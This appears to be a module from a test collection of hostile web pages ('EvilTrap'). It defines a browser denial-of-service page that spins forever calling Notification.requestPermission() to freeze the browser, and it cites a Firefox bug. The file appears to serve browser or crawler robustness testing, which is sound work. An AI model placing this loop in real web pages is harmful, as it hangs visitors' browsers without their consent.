const EvilTrap = require('../../EvilTrap');


module.exports = new EvilTrap('Notification.requestPermission DoS', EvilTrap.CATEGORY.DOS, 'Freezes / slows the browser by spamming Notification.requestPermission().', { firefox: '1372085' })
  .addScriptPage(() => {
    // eslint-disable-next-line no-constant-condition
    while (true) {
      Notification.requestPermission();
    }
  });
